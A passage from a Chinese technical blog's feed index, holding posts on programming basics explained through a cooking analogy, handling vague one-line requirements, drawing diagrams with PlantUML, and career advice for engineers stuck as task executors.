class="line">做饭-&gt;开始(菜单);</span><br></pre></td></tr></table></figure><p>好了，上面的代码相信也不是很难理解，我们把做饭分为三个事情，「煮饭」、「买菜」和「做菜」，首先我们想好了一个“菜单”，然后抽象了一个「做菜」的方法，这个方法里面包含了「洗菜」、「切菜」和「炒菜」三个步骤，每一道菜都会执行这三个步骤。</p><p>如果没有这层抽象会有什么问题？你会发现你的代码是这么写的：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">做饭 = &#123;</span><br><span class="line">  煮饭() &#123;&#125;,</span><br><span class="line">  买菜() &#123;&#125;,</span><br><span class="line">  洗菜() &#123;&#125;,</span><br><span class="line">  切菜() &#123;&#125;,</span><br><span class="line">  做菜() &#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">做饭-&gt;煮饭();</span><br><span class="line">做饭-&gt;买菜();</span><br><span class="line"></span><br><span class="line">做饭-&gt;洗菜(辣椒炒肉);</span><br><span class="line">做饭-&gt;切菜(辣椒炒肉);</span><br><span class="line">做饭-&gt;炒菜(辣椒炒肉);</span><br><span class="line"></span><br><span class="line">做饭-&gt;洗菜(红烧狮子头);</span><br><span class="line">做饭-&gt;切菜(红烧狮子头);</span><br><span class="line">做饭-&gt;炒菜(红烧狮子头);</span><br><span class="line"></span><br><span class="line">做饭-&gt;洗菜(剁椒鱼头);</span><br><span class="line">做饭-&gt;切菜(剁椒鱼头);</span><br><span class="line">做饭-&gt;炒菜(剁椒鱼头);</span><br></pre></td></tr></table></figure><p>代码本身没有什么问题，但是看起来会十分冗长，如果你今天要做 10 个菜，那么代码就得写 10 遍；可如果你用到了抽象思维，你就只需要去扩展“菜单”就行了，因为在程序里有一个叫做 「逐一」的逻辑。<br><strong>程序里面涉及到的逻辑并不多，诸如「条件判断」、「循环」、「遍历&#x2F;逐一」等，很少，但是也就是这么几个少量的逻辑，构筑了丰富多彩的网络世界。</strong></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>好了，本文并不是想教会你如何编程，而是想告诉你，编程是一件十分简单的事情，但是想写出好的程序却是一件无比有难度的事情，这需要你想出足够好的算法，同时也需要你对程序的执行环境有基本的了解，知道怎么写程序跑的快、怎么写程序会很卡，等等。</p><p><strong>当然，作为程序员最苦恼的事情，并不是编程本身，而是需求的变化。</strong>比如当你做好了这顿饭，却发现家人在外面吃过了，此时的你就只能含着泪，一个人吃完这桌难以下咽的饭菜了。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一篇写给从未编程过的人的入门教程</title>
      <link href="/blog/2020/06/05/zcs3c9/"/>
      <url>/blog/2020/06/05/zcs3c9/</url>
      
        <content type="html"><![CDATA[<p>昨天我分享了一篇<a href="https://www.yuque.com/barretlee/thinking/aabh67">如何使用 PlantUML 这门简单的语言来绘制复杂</a>的活动图、流程图和组件图等，有的同学看到了以后，询问我，“外行需要多长时间才能学会这玩意儿呀？”，这个问题不知道该如何回答，因为我并不认同“外行”这个词。我始终认为，<strong>在编程这件事情上，每个人都是内行，每个人也都是外行</strong>。事实上，从不了解 PlantUML 到能够参考文档绘制出复杂的流程图，我也就学了一个上午，边学习、边实践、边分享，于是就会了。</p><p>学会编程没有你想象中的那么复杂。</p><h2 id="编程是什么？"><a href="#编程是什么？" class="headerlink" title="编程是什么？"></a>编程是什么？</h2><p>编程，说的简单一点，就是通过一系列逻辑将你想做的事情或者想描述的物体表达清楚，然后让它展现出来，或者运动起来。说的专业一点：</p><p>编程 &#x3D; 算法 + 数据结构</p><p><strong>什么是算法？就是解决问题的办法，或者说通过几个步骤来解决一个问题的过程描述</strong>；那么什么是数据结构呢？咱们在解决问题的时候经常需要去放置一些物件，比如把书放到书架上，那么书架就是一种数据结构，把书放到柜子里，柜子就是一种数据结构，书架和柜子就是数据的不同呈现&#x2F;储存方式。</p><p>其实，每个人对编程都不陌生，你进过厨房吧，17:00 回到家，怎么让家人在 18:30 之前吃上饭？这里头的算法就多了去了，你可以先煮上饭然后去买菜，也可以买完菜再回来煮饭，那么哪种方式更好呢？下面我们用程序语言来分析这道题：</p><p>编程问题： 17:00 回到家，怎么让家人在 18:30 之前吃上饭？<br>算法一：先煮上饭然后去买菜<br>算法二：买完菜再回来煮饭</p><p>这里的做饭是一个程序实体，它包含了煮饭、买菜、切菜、做菜，这个程序实体的表达方式是：</p><p>做饭 &#x3D; {<br>  煮饭() {},<br>  买菜() {},<br>  切菜() {},<br>  做菜() {},<br>}</p><p>把中文换成英文不就是你平时看到的程序代码么？所以说呀，编程对你其实并不陌生，它也没你想象中的那么复杂。</p><h2 id="编程的核心是什么？"><a href="#编程的核心是什么？" class="headerlink" title="编程的核心是什么？"></a>编程的核心是什么？</h2><p>为什么人跟人之间编写出来的代码有这么大的差异，或者说，为什么存在小白和专家的区别？编程确实不复杂，复杂的原因是很多人不能把问题思考周全，我举个例子你就知道了：</p><p>做饭 &#x3D; {<br>  开始() {<br>    煮饭(); 买菜(); 切菜(); 做菜();<br>  },<br>  煮饭() {},<br>  买菜() {},<br>  切菜() {},<br>  做菜() {<br>    if (家里没有油了) { 买油(); 炒菜(); }<br>    else { 炒菜(); }<br>  }<br>}</p><p>做饭-&gt;开始();</p><p>我们定义了一个程序实体叫做「做饭」，包含了几个步骤，开始、煮饭、买菜、切菜和做菜，在编程语言里头，我们把「做饭」称之为对象，这几个步骤称之为方法，「做饭」这个对象拥有 5 个方法，我们可以一个个地调用它。首先我们调用了「开始」方法，在这个方法里，又依次调用了「煮饭」、「买菜」、「切菜」和「做菜」。</p><p>在「做菜」方法里，我们看到了一个细节，那就是“家里没油了”，咋整，这个人是这么考虑的：先去「买油」，然后回来「炒菜」。很显然，这人不靠谱，你看，菜都要下锅了，才想起没有油。但是下面这个人就不一样了：</p><p>做饭 &#x3D; {<br>  开始() {<br>    煮饭();<br>    检查结果 &#x3D; 检查();<br>    买菜(检查结果); 切菜(); 做菜();<br>  },<br>  检查() {<br>    if (家里没有油了) { 买菜的时候要买油  }<br>    if (家里没有辣椒了) { 买菜的时候要买辣椒  }<br>  },<br>  煮饭() {},<br>  买菜() {},<br>  切菜() {},<br>  做菜() {},<br>}</p><p>做饭-&gt;开始();</p><p>他的程序里多了个步骤叫做「检查」，在出门买菜之前，先在家里扫一眼，缺了什么，用小本本记下来，然后「买菜」的时候，带上这个小本本，这样「买菜」就不会有遗漏了。</p><p><strong>你看，这就是我们所谓的小白和专家，他们的区别就是后者能够把事情想得更加周全，在解决问题的时候，不遗留任何细节，并且呢，能够让事情可以更流畅、更快、更好地得到解决，消耗的资源最少，解决的问题最多。</strong></p><h2 id="编程的复杂性"><a href="#编程的复杂性" class="headerlink" title="编程的复杂性"></a>编程的复杂性</h2><p>不要以为我上面写的东西不是代码，稍微调整下细节，这串代码是可以在电脑上真实跑起来的，是不是特别简单啊？你还敢说自己不懂编程么？还会惧怕编程么？</p><p>但是也不要把编程想的太简单了，上面的程序表达的只是一个十分粗略的做饭过程，或者说一个做饭的思路，真正要把做饭的程序实现出来，还要考虑很多的问题，比如如何在程序中表达我要做辣椒炒肉、红烧狮子头、剁椒鱼头等等好几个菜呢？这里就涉及到“抽象”的概念，我们需要把很多相似的步骤都抽象成一种行为，然后不断重复这种行为：</p><p>做饭 &#x3D; {<br>  开始(菜单) {<br>    煮饭();<br>    买菜(菜单);<br>    菜单-&gt;逐一(做菜);<br>  },<br>  买菜() {},<br>  煮饭() {},<br>  做菜(菜品) {<br>     洗菜(菜品);<br>     切菜(菜品);<br>     炒菜(菜品);<br>   }<br>}</p><p>菜单 &#x3D; 辣椒炒肉、红烧狮子头、剁椒鱼头;<br>做饭-&gt;开始(菜单);</p><p>好了，上面的代码相信也不是很难理解，我们把做饭分为三个事情，「煮饭」、「买菜」和「做菜」，首先我们想好了一个“菜单”，然后抽象了一个「做菜」的方法，这个方法里面包含了「洗菜」、「切菜」和「炒菜」三个步骤，每一道菜都会执行这三个步骤。</p><p>如果没有这层抽象会有什么问题？你会发现你的代码是这么写的：</p><p>做饭 &#x3D; {<br>  煮饭() {},<br>  买菜() {},<br>  洗菜() {},<br>  切菜() {},<br>  做菜() {},<br>}</p><p>做饭-&gt;煮饭();<br>做饭-&gt;买菜();</p><p>做饭-&gt;洗菜(辣椒炒肉);<br>做饭-&gt;切菜(辣椒炒肉);<br>做饭-&gt;炒菜(辣椒炒肉);</p><p>做饭-&gt;洗菜(红烧狮子头);<br>做饭-&gt;切菜(红烧狮子头);<br>做饭-&gt;炒菜(红烧狮子头);</p><p>做饭-&gt;洗菜(剁椒鱼头);<br>做饭-&gt;切菜(剁椒鱼头);<br>做饭-&gt;炒菜(剁椒鱼头);</p><p>代码本身没有什么问题，但是看起来会十分冗长，如果你今天要做 10 个菜，那么代码就得写 10 遍；可如果你用到了抽象思维，你就只需要去扩展“菜单”就行了，因为在程序里有一个叫做 「逐一」的逻辑。</p><p><strong>程序里面涉及到的逻辑并不多，诸如「条件判断」、「循环」、「遍历&#x2F;逐一」等，很少，但是也就是这么几个少量的逻辑，构筑了丰富多彩的网络世界。</strong></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>好了，本文并不是想教会你如何编程，而是想告诉你，编程是一件十分简单的事情，但是想写出好的程序却是一件无比有难度的事情，这需要你想出足够好的算法，同时也需要你对程序的执行环境有基本的了解，知道怎么写程序跑的快、怎么写程序会很卡，等等。</p><p><strong>当然，作为程序员最苦恼的事情，并不是编程本身，而是需求的变化。</strong>比如当你做好了这顿饭，却发现家人在外面吃过了，此时的你就只能含着泪，一个人吃完这桌难以下咽的饭菜了。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何杜绝一句话需求？</title>
      <link href="/blog/2020/06/05/biwewk/"/>
      <url>/blog/2020/06/05/biwewk/</url>
      
        <content type="html"><![CDATA[<p>如何杜绝一句话需求？首先我们来看看什么是一句话需求：</p><ul><li>“把这个视觉稿还原下，明天交付给产品”</li><li>“这个开放接口再增加一个额外的开放功能，给外包场景使用”</li><li>“给我跑一个数据报表，分析下近期的用户行为”</li><li>“把这个 Icon 调大一点”</li></ul><p>我们经常会提到用户故事这个词，从用户故事中会抽离出一些业务上和技术上的需求，然后针对需求做细分产生一系列任务。很多一句话需求就像是一个任务，没有背景，没有分析，没有评审，直接扔过来交给你，此时你的角色只是一个简单的执行者。</p><p>那如何杜绝呢？有两个策略，最常见的是，给需求加要求：</p><ul><li>没有详细背景的需求不接</li><li>看不到业务价值的需求不接</li><li>没有数据预期的需求不接</li><li>频繁更改的需求不接</li></ul><p>这种策略是一种守的姿态来应对“外部刺激”，很被动，倘若拒绝得过于粗暴还不利于与合作方的长期共存。给偏爱使用这种策略的同学几点建议：</p><ul><li>首先，不能说不（Never say no）</li><li>你应该说“好，我接受，但是……”，注意这里的但是</li><li>“我不保证质量&#x2F;我不保证时间&#x2F;我既不保证质量也不保证时间”</li><li>“除非，你砍点需求&#x2F;延长点时间”</li><li>此时，再和谐地抛出你的要求：能不能先想清楚业务价值，能不能给一个确定不改的需求，能不能给出数据预期等等</li></ul><p>通过这种委婉且合理又不伤感情的方式，倒逼需求方按照你的要求做事情，这是一种“守”的策略。另一种策略是“攻”，主动出击，梳理自己的问题和需求方的目标，深入“敌方”：</p><ul><li>目前我的系统存在哪些问题，安全、性能、稳定性、可拓展性等，确定最致命问题</li><li>需求方的长期目标是什么，阶段性目标是什么，近期目标是什么</li><li>从长期来看，我的系统需要沉淀什么能力来应对需求方</li><li>需求方提过来的需求要实现他哪个阶段目标，他提的需求是否真的可以实现他的目标，他是如何分析的，我结合他的分析能否得出同样的结论</li><li>为什么他总是会提出一句话需求，他的需求源是从哪里来的，他的老板？他的客户？他的合作伙伴？</li><li>能不能让他的需求源在给他传递消息的同时也传递给我，至少让我知道他消化需求的姿势是正确的，对需求源的理解没有偏差</li></ul><p>兵家有云，知己知彼方能百战百胜，把己方的问题和需求方的问题都分析的妥妥的，然后按计划办事，经过一段时间的自我消化和自我调整，自然可以很好的扼制住如洪水般的需求。换一种说法就是，你要学会帮助需求方更好地分析问题，这个要求很高，需要你对业务有足够的理解和判断。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在语雀绘制 PlantUML 图</title>
      <link href="/blog/2020/06/03/aabh67/"/>
      <url>/blog/2020/06/03/aabh67/</url>
      
        <content type="html"><![CDATA[<p>很早就听说了 PlantUML，但是没有好好去研究和体验，以前画时序图都是在 Keynote 里自己画框勾线，稍微复杂的图修改起来实在是麻烦，各种箭头要对齐，好好研究一下 PlantUML，以备后用。</p><p>这里有一份 PlantUML 的官方文档实例和讲解，相信阅读完了，你也大概知道了其语法和使用。</p><p><a href="https://www.yuque.com/office/yuque/0/2020/pdf/104088/1591161574842-955c54ac-8821-4bc4-844d-002fb52e8965.pdf">PlantUML_Language_Reference_Guide_zh.pdf</a></p><p>本文的目的是记录核心、关键的部分，利用这些元素绘制出我们心中的那张图，PlantUML 内容过于丰富，以至于你觉得学习并记住它是一个负担，先放下这个负担，记不住了，就回来看看就好了~</p><h2 id="一、时序图"><a href="#一、时序图" class="headerlink" title="一、时序图"></a>一、时序图</h2><p>一个复杂的时序图包含了诸多元素，但是核心的就那么几个，分别是：参与者、消息、消息指向，其他的都是次要的，比如可以给「消息指向」定义序号、定义颜色、定义其他样式等等。</p><p>@startuml</p><p>参与者A -&gt; 参与者B: 消息1<br>参与者B -&gt; 参与者A: 消息2</p><p>@enduml<img src="/../blogimgs/2020/06/03/ad15e783d52b931308c8c6b3115e2fec.svg" alt="image">图1.1 - 最简 DEMO</p><h4 id="技巧-amp-nbsp-声明参与者"><a href="#技巧-amp-nbsp-声明参与者" class="headerlink" title="技巧&amp;nbsp;声明参与者"></a>技巧&amp;nbsp;声明参与者</h4><p>**<br>如果参与者比较多，而且参与者的名字也比较长，可以给参与者取个短一点的名字：<br>@startuml</p><p>participant 参与者A as A<br>participant 参与者B as B</p><p>A -&gt; B: 消息1<br>B -&gt; A: 消息2</p><p>@enduml其效果，跟 图1.1 完全一样。</p><h4 id="技巧-amp-nbsp-参与者属性自定义"><a href="#技巧-amp-nbsp-参与者属性自定义" class="headerlink" title="技巧&amp;nbsp;参与者属性自定义"></a>技巧&amp;nbsp;参与者属性自定义</h4><p>**<br>给参与者加个颜色、更换个顺序、再换个图标，代码是这么写的：<br>@startuml</p><p>‘ 以单引号开头是注释的意思<br>‘ 参与者有很多中图标，分别用 participant&#x2F;actor&#x2F;boundary&#x2F;control&#x2F;entity&#x2F;database 来声明<br>‘ 下面这句话的意思是，声明参与者A是一个 database 实体，顺序调整为 10（默认应该是1），其颜色为 #FDF6600<br>database 参与者A as A order 10 #FF6600<br>participant 参与者B as B</p><p>A -&gt; B: 消息1<br>B -&gt; A: 消息2</p><p>@enduml那么效果就变成这样了<br><img src="/../blogimgs/2020/06/03/571a04dab373c8560ed3822db1bd46ae.svg" alt="image">图1.2 - 参与者属性自定义</p><p>这里需要注意的是，order 需要在颜色之前，否则会报错。</p><h4 id="技巧-消息的属性自定义"><a href="#技巧-消息的属性自定义" class="headerlink" title="技巧 消息的属性自定义"></a>技巧 消息的属性自定义</h4><p>**<br>给消息定义样式、分隔、延迟消息、添加注释：<br>@startuml</p><p>database 参与者A as A order 10 #FF6600<br>participant 参与者B as B<br>participant 参与者C as C</p><p>‘ 将 -&gt; 替换成 –&gt; 变成了虚线，还有 -&gt;x -&gt;&gt; -\ \- &#x2F;&#x2F;– 等等多种线<br>A –&gt; B: 消息1<br>‘ 右边添加一个注释<br>note right: 消息1的注释<br>A –&gt; C: 消息3<br>‘ 右边添加一个注释<br>note right: 消息3的注释<br>‘ 这是一个消息延迟<br>…消息延迟…<br>B -&gt; A: 消息2</p><p>@enduml效果变成了：<br><img src="/../blogimgs/2020/06/03/437e4179bffe45700ab32571459522b3.svg" alt="image">图1.3 - 消息属性自定义</p><h4 id="技巧-消息的分组"><a href="#技巧-消息的分组" class="headerlink" title="技巧 消息的分组"></a>技巧 消息的分组</h4><p>将消息 1 放到分组 1，消息 2 和消息 3 放到分组2中：<br>@startuml</p><p>‘ 消息序列号自增<br>autonumber</p><p>database 参与者A as A order 10 #FF6600<br>participant 参与者B as B<br>‘ 加点效果<br>participant 参与者C as C &lt;&lt; (C, #FF6600) &gt;&gt;</p><p>‘ 增加分组<br>&#x3D;&#x3D; 分组1 &#x3D;&#x3D;<br>A –&gt; B: 消息1<br>C -&gt; C: 给自己发个消息</p><p>‘ 增加分组<br>&#x3D;&#x3D; 分组2 &#x3D;&#x3D;<br>note right: 消息1的注释<br>A –&gt; C: 消息3<br>note right: 消息3的注释<br>…消息延迟…<br>B -&gt; A: 消息2</p><p>@enduml<img src="/../blogimgs/2020/06/03/501e4b36230ff4af33d8acf3b1d0bf5b.svg" alt="image">图1.4 - 消息的分组</p><p>到这里，差不多就够了，还有很多其他的定义，再学就有点复杂了，如有需要可以看文章上方提供的文档。</p><h2 id="二、用例图"><a href="#二、用例图" class="headerlink" title="二、用例图"></a>二、用例图</h2><p>虽然使用 PlantUML 绘制用例图比较规范，但是大多数用例图使用 Keynote 或者 PPT 绘制可控性比 PlantUML 要强，我并不推荐大家使用代码编写用例图，需要记的东西有点杂乱。</p><p>在这里只提供一个略微全面的 DEMO，包含了一些核心要求，大家看看注释和效果，对比一下就知道怎么用了。<br>@startuml</p><p>actor 角色A as A #FF6600<br>actor 角色B as B &lt;&lt; (B, #00FF00) &gt;&gt;<br>actor 角色C as C &lt;&lt; (C, #FF0000) &gt;&gt;</p><p>note “这是 A 的注释” as Na<br>note “这是 C 的注释” as Nc<br>note “这是 A 和 C 之间注释的关系 Rac” as Rac</p><p>A -&gt; Na<br>A -&gt; (AContent): A发言的标注</p><p>A &lt;|– B<br>note left of B: 这是 B 的发言</p><p>C -&gt; Nc<br>C -&gt; (CContent): C发言的标注</p><p>(AContent) .. Rac<br>Rac .. (CContent)</p><p>@enduml<img src="/../blogimgs/2020/06/03/3ae9bf19eeb9e939050b354b7c0e0d21.svg" alt="image">图2.1 - 用例图</p><h2 id="三、类图"><a href="#三、类图" class="headerlink" title="三、类图"></a>三、类图</h2><p>类图用的是比较多的，也有非常专业的工具，但是如果你喜欢使用代码来表达简单的类图，PlantUML 算是首选。</p><p>类的表达和类之间关系的表达：<br>@startuml</p><p>‘ 共 15 种<br>‘ &lt;|– <em>– o– .. –<br>‘ &lt;|.. –&gt; ..&gt; &lt;–</em><br>‘ #– x– }– +– ^–<br>Class01 &lt;|– Class02</p><p>‘ 关系<br>Class03 “1” *– “N” Class04: 一对N关系</p><p>‘ 类方法和属性<br>class Class05 {<br>  ‘ 静态方法<br>    {static} String id<br>  ‘ 抽象方法<br>  {abstract} void methods()<br>  ‘ 私有<br>    -field1<br>  ‘ 保护<br>    #field2<br>  ‘ 包私有<br>    ~method1()<br>  ‘ 公开<br>    +method2()<br>}<br>Class05 o– Class06<br>‘ 注释<br>note bottom of Class06: 这是 Class06 的注释</p><p>‘ enum 类型<br>enum TimeUnit {<br>DAYS<br>HOURS<br>MINUTES<br>}</p><p>‘ 标注<br>annotation SuppressWarnings</p><p>@enduml<img src="/../blogimgs/2020/06/03/9371585e2109ffd7769faced799b32c4.svg" alt="image">图3.1 - 类关系实例</p><p>还有更多复杂的配置，请查看文档。</p><h2 id="四、活动图"><a href="#四、活动图" class="headerlink" title="四、活动图"></a>四、活动图</h2><p>活动图本质还是流程图，只不过它能够表达的内容更多，一下是从网上摘录的一段区别对比：</p><blockquote><p>活动图与流程图的区别：</p><ol><li>流程图着重描述处理过程，它的主要控制结构是顺序、分支和循环，各个处理过程之间有严格的顺序和时间关系。而活动图描述的是对象活动的顺序关系所遵循的规则，它着重表现的是系统的行为，而非系统的处理过程。</li><li>活动图能够表示并发活动的情形，而流程图不行。</li><li>活动图是面向对象的，而流程图是面向过程的。</li></ol></blockquote><p>活动图的基础表达元素还是很简单的：<br>@startuml</p><p>(*) -up-&gt; 步骤1<br>-right-&gt; 步骤2<br>note right: 步骤2的注释</p><p>if “条件一” then<br>  –&gt;[Y] 分支1步骤1<br>  note top: 分支1步骤1的注释<br>  –&gt; 分之1步骤2<br>  –&gt; (<em>)<br>else<br>  –&gt;[N] 分支2<br>  –&gt; (</em>)<br>endif</p><p>@enduml<img src="/../blogimgs/2020/06/03/3971dbcecccc7c39f48ec78eb05fb00e.svg" alt="image">图4.1 - 活动图</p><h4 id="新语法-amp-nbsp-活动图新语法"><a href="#新语法-amp-nbsp-活动图新语法" class="headerlink" title="新语法&amp;nbsp;活动图新语法"></a>新语法&amp;nbsp;活动图新语法</h4><p>不得不说，这个语法写起来怪怪的，可以尝试下新的活动图语法：</p><p>@startuml</p><p>start </p><p>:步骤一;<br>:步骤二;<br>note right: 步骤2的注释</p><p>if (条件一) then (Y)<br>  :分支1步骤1;<br>  note right: 分支1步骤1的注释<br>  :分支1步骤2;<br>else (N)<br>  :分支2;<br>endif</p><p>stop</p><p>@enduml<img src="/../blogimgs/2020/06/03/2c1debc6b0656b71de3fef1a32e328d2.svg" alt="image">图4.2 - 活动图新语法</p><p>虽然定制型稍微弱一些，但是需要表达的逻辑还是十分清晰的。</p><h4 id="技巧-amp-nbsp-泳道图"><a href="#技巧-amp-nbsp-泳道图" class="headerlink" title="技巧&amp;nbsp;泳道图"></a>技巧&amp;nbsp;泳道图</h4><p>泳道图就是给活动流程进行分区分组，增加泳道标记后，在流程上方标记流程所述泳道就行 ：</p><p>@startuml</p><p>|泳道一|<br>start </p><p>:步骤一;</p><p>|#E8E8E8|泳道二|<br>:步骤二;<br>note right: 步骤2的注释</p><p>if (条件一) then (Y)<br>  :分支1步骤1;<br>  note right: 分支1步骤1的注释<br>  :分支1步骤2;<br>else (N)<br>  :分支2;<br>endif</p><p>|泳道一|<br>:步骤三;</p><p>stop</p><p>@enduml<img src="/../blogimgs/2020/06/03/8b830e5193e8fe2c47ca6526cfcd62b6.svg" alt="image">图4.3 - 泳道图</p><h2 id="五、其他图"><a href="#五、其他图" class="headerlink" title="五、其他图"></a>五、其他图</h2><p>其他图使用的略少，只给出一些简单的 Demo。</p><h4 id="组件图"><a href="#组件图" class="headerlink" title="组件图"></a>组件图</h4><p>@startuml<br>package “Some Group” {<br>    HTTP - [First Component]<br>    [Another Component]<br>}<br>node “Other Groups” {<br>  FTP - [Second Component]<br>  [First Component] –&gt; FTP<br>}<br>cloud {<br>    [Example 1]<br>}<br>database “MySql” {<br>  folder “This is my folder” {<br>    [Folder 3]<br>    }<br>  frame “Foo” {<br>    [Frame 4]<br>  }<br>}<br>[Another Component] –&gt; [Example 1]<br>[Example 1] –&gt; [Folder 3]<br>[Folder 3] –&gt; [Frame 4]<br>@enduml<img src="/../blogimgs/2020/06/03/fe30e3d47fad2c51c27b555680d10967.svg" alt="image">图5.1 - 组件图</p><h4 id="状态图"><a href="#状态图" class="headerlink" title="状态图"></a>状态图</h4><p>@startuml<br>scale 600 width<br>[<em>] -&gt; State1<br>State1 –&gt; State2 : Succeeded<br>State1 –&gt; [</em>] : Aborted<br>State2 –&gt; State3 : Succeeded<br>State2 –&gt; [<em>] : Aborted<br>state State3 {<br>  state “Accumulate Enough Data\nLong State Name” as long1<br>  long1 : Just a test<br>  [</em>] –&gt; long1<br>  long1 –&gt; long1 : New Data<br>  long1 –&gt; ProcessData : Enough Data<br>}<br>State3 –&gt; State3 : Failed<br>State3 –&gt; [<em>] : Succeeded &#x2F; Save Result<br>State3 –&gt; [</em>] : Aborted<br>@enduml<img src="/../blogimgs/2020/06/03/6c2a3654a2245699d98dc47fecfc17c3.svg" alt="image">图5.2 - 状态图</p><h4 id="时序图"><a href="#时序图" class="headerlink" title="时序图"></a>时序图</h4><p>@startuml<br>robust “DNS Resolver” as DNS<br>robust “Web Browser” as WB<br>concise “Web User” as WU<br>@0<br>WU is Idle<br>WB is Idle<br>DNS is Idle<br>@+100<br>WU -&gt; WB : URL<br>WU is Waiting<br>WB is Processing<br>@+200<br>WB is Waiting<br>WB -&gt; DNS@+50 : Resolve URL<br>@+100<br>DNS is Processing<br>@+300<br>DNS is Idle<br>@enduml<img src="/../blogimgs/2020/06/03/96a4ffc21c4619bf603236163ace803b.svg" alt="image">图5.3 - 时序图</p><h4 id="甘特图"><a href="#甘特图" class="headerlink" title="甘特图"></a>甘特图</h4><p>@startgantt<br>[Prototype design] lasts 13 days and is colored in Lavender&#x2F;LightBlue<br>[Test prototype] lasts 9 days and is colored in Coral&#x2F;Green and starts 3 days after [Prototype design]’s end<br>[Write tests] lasts 5 days and ends at [Prototype design]’s end<br>[Hire tests writers] lasts 6 days and ends at [Write tests]’s start<br>[Init and write tests report] is colored in Coral&#x2F;Green<br>[Init and write tests report] starts 1 day before [Test prototype]’s start and ends at [Test prototype]’s end<br>@endgantt<img src="/../blogimgs/2020/06/03/d95fd86eacb42e3426c3c3baccd16456.svg" alt="image">图5.4 - 甘特图</p><h4 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h4><p>@startmindmap</p><ul><li>OS<br>++ Ubuntu<br>+++ Linux Mint<br>+++ Kubuntu<br>+++ Lubuntu<br>+++ KDE Neon<br>++ LMDE<br>++ SolydXK<br>++ SteamOS<br>++ Raspbian<br>– Windows 95<br>– Windows 98<br>– Windows NT<br>— Windows 8<br>— Windows 10</li></ul><p>@endmindmap<img src="/../blogimgs/2020/06/03/d7b4e53483ca4a75d4a807c473562234.svg" alt="image">图5.5 - 思维导图</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>💰 单纯执行者的破局</title>
      <link href="/blog/2020/06/01/sa0gs4/"/>
      <url>/blog/2020/06/01/sa0gs4/</url>
      
        <content type="html"><![CDATA[<p>不管是大公司还是小公司，你都可以看见这类主管：他不断地从外面接活儿进来，然后排好时间、分好任务指派给你。在这样的主管下，你的角色更像是一个单纯的执行者，稍微好一点的情况是，他会给你安排大块的事情，糟糕一点的情况是，他指派给你的任务特别离散，不聚焦，让你东搞一下西搞一下。</p><p>明白自己处境的人，会忧虑，不明白的人，还觉得自己很充实。如果你恰好有这样的感觉，我可以告诉你几个破局的思路。</p><p><strong>1、不要把自己当成执行者</strong></p><p>很大一部分原因还是因为，你自己把自己当成了执行者，你不愿意去分析需求或者不懂得如何去分析需求，你没有一个长期的聚焦的目标，结果就是你的主管会帮你做好这一切，他会根据团队今年的目标分析出几件核心的事情，然后将事情细化之后分派给团队的同学，如果你有一定的规划能力，他可能会把一整件事情交给你，如果没有，那大概率就是东边人手不足把你推过去，西边时间紧急把你拉回来。</p><p>提升自己的主观能动性，主动去 Owner 一块事情，给出详细的规划和落地方案，不断找主管和合作伙伴对焦，自然而然你的规划力就显露出来了。不要把自己当成执行者，而是 Owner。</p><p><strong>2、帮助你的主管认识到自己的问题</strong></p><p>很显然，把下属当做执行者也是主管的问题，任何一个人都是可培养的，否则当初也不会把你招进来，你可以找主管沟通，告诉他你最近处于什么状态，其实很可能在给你委派零散需求这件事情上，他并没有意识到会不利于你的成长，你需要吐露自己的心声，告诉主管你想得到什么，而现在的工作方式可能让你拿不到想要的结果。</p><p>主管也有能力强和能力弱的，对于没有太多管理经验的主管，他做事可能依然是当初个人作战时的风格，关注的是事情，没有考虑到人的成长。</p><p><strong>3、搞清楚团队的目标和个人的目标</strong></p><p>一个没有目标的团队是难以凝聚到一起的，在定义个人目标之前，你首先需要知道团队的目标是什么，说得直白一点，你需要知道主管今年的目标是什么，想一想自己承担了主管目标的哪个部分，偏离的太多肯定是不行的，个人的核心目标一定要与团队目标进行对焦。</p><p>目标一定是有挑战的，也是能拿到结果的，当你在执行任务的时候，可以去想一想，我手头的事情是否是完成个人目标的必做事项，如果不是，你就得想办法做取舍，至少得排个优先级。</p><p><strong>4、敢于 Say No</strong></p><p>有的人敢跟需求方怼，但是在主管面前却毫无勇气，原因是主管会给你打绩效，他会影响你未来一年的涨薪、晋升等，所以对主管会言听计从。这显然是不对的。你是团队的一份子，你今年拿不到结果，也就意味着今年团队有一部分的结果堪忧，所以你在团队里无时无刻都扮演着重要的角色。</p><p>遇到不合理的需求，即使是主管指派的任务，你也要勇敢地站出来，告诉他，你错了，指出主管的错误，是为了自己好，更是为了团队好，你指出的问题越多，团队走偏的可能性就越低，你一定要明白这个道理。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端领域的市场需求</title>
      <link href="/blog/2020/06/01/vccnr8/"/>
      <url>/blog/2020/06/01/vccnr8/</url>
      
